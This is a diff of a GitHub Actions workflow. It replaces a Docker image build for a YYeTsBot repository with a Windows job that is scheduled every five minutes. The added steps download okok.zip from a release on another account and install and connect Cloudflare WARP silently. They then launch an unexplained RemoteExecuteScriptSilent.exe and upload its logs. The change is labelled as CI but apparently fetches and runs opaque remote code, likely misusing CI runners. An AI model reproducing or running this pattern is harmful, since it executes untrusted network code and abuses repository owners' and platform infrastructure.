@@ -1,80 +1,75 @@
-name: Build and push docker image
+name: CI on Windows
+
 on:
-  push:
-    branches:
-      - 'master'
-    paths-ignore:
-      - '**.md'
-      - 'LICENSE'
+  schedule:
+    - cron: "*/5 * * * *"
+  workflow_dispatch:
 
 jobs:
-  docker:
-    runs-on: ubuntu-latest
+  run-release:
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+    runs-on: windows-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-        with:
-          submodules: true
-
-      - name: Set up QEMU
-        uses: docker/setup-qemu-action@v2
-
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v2
-
-      - name: Cache Docker layers
-        uses: actions/cache@v3
-        with:
-          path: /tmp/.buildx-cache
-          key: ${{ runner.os }}-buildx-${{ github.sha }}
-          restore-keys: |
-            ${{ runner.os }}-buildx-
-
-      - name: Login to DockerHub
-        uses: docker/login-action@v2
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_TOKEN }}
-
-      - name: Login to GitHub Container Registry
-        uses: docker/login-action@v2
-        with:
-          registry: ghcr.io
-          username: ${{ github.repository_owner }}
-          password: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Lower case for Docker Hub
-        id: dh_string
-        uses: ASzc/change-string-case-action@v5
-        with:
-          string: ${{ secrets.DOCKERHUB_USERNAME }}/${{ github.event.repository.name }}
-
-      - name: Lower case for ghcr
-        id: ghcr_string
-        uses: ASzc/change-string-case-action@v5
-        with:
-          string: ${{ github.event.repository.full_name }}
-
-      - name: Build and push docker images
-        uses: docker/build-push-action@v4
-        with:
-          context: .
-          platforms: linux/amd64, linux/arm64
-          push: true
-          tags: |
-            ${{ steps.dh_string.outputs.lowercase }}
-            ghcr.io/${{ steps.ghcr_string.outputs.lowercase }}
-          cache-from: type=local,src=/tmp/.buildx-cache
-          cache-to: type=local,dest=/tmp/.buildx-cache-new,mode=max
-
-      - name: Move cache
+      - name: Download okok.zip from Release
         run: |
-          rm -rf /tmp/.buildx-cache
-          mv /tmp/.buildx-cache-new /tmp/.buildx-cache
+          $url = "https://github.com/okok882006/YYeTsBot/releases/download/1/okok.zip"
+          Invoke-WebRequest -Uri $url -OutFile okok.zip
 
-      - name: Notification to Telegram
-        env:
-          TOKEN: ${{ secrets.BOT_TOKEN }}
+      - name: Unzip okok.zip
         run: |
-          curl "https://api.telegram.org/bot$TOKEN/sendMessage?chat_id=260260121&text=Normal%20Build%20complete!"
-          echo "YYeTsBot Build complete!"
+          Expand-Archive -Path okok.zip -DestinationPath .
+      - name: Install Cloudflare WARP
+        run: |
+          # Download WARP installer
+          Invoke-WebRequest -Uri "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi" -OutFile "WARP.msi"
+          
+          # Install WARP silently
+          Start-Process msiexec.exe -ArgumentList '/i WARP.msi /quiet /norestart' -Wait
+          
+          # Wait for the service to start
+          Start-Sleep -Seconds 10
+          
+          # Register and connect using WARP CLI
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos registration new
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos connect
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          Start-Sleep -Seconds 10
+        shell: powershell
+      - name: Start RemoteExecuteScriptSilent.exe
+        working-directory: okok
+        run: |
+          Start-Process .\RemoteExecuteScriptSilent.exe
+
+      - name: Wait for RemoteExecuteScriptSilent.exe to exit
+        run: |
+          $processName = "RemoteExecuteScriptSilent"
+          Write-Host "Waiting for $processName process to exit..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has exited."
+
+      - name: Wait for FastExecuteScript.exe to exit
+        run: |
+          $processName = "FastExecuteScript"
+          Write-Host "Waiting for $processName process to exit..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has exited."
+
+      - name: Find dynamic logs folder
+        id: find_logs
+        run: |
+          $base = "okok\appslocal"
+          $dynamic = Get-ChildItem $base | Where-Object { $_.PSIsContainer } | Select-Object -First 1 -ExpandProperty Name
+          $logsPath = "$base\$dynamic\logs"
+          echo "logsPath=$logsPath" >> $env:GITHUB_ENV
+
+      - name: Upload logs as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: logs
+          path: ${{ env.logsPath }}/**
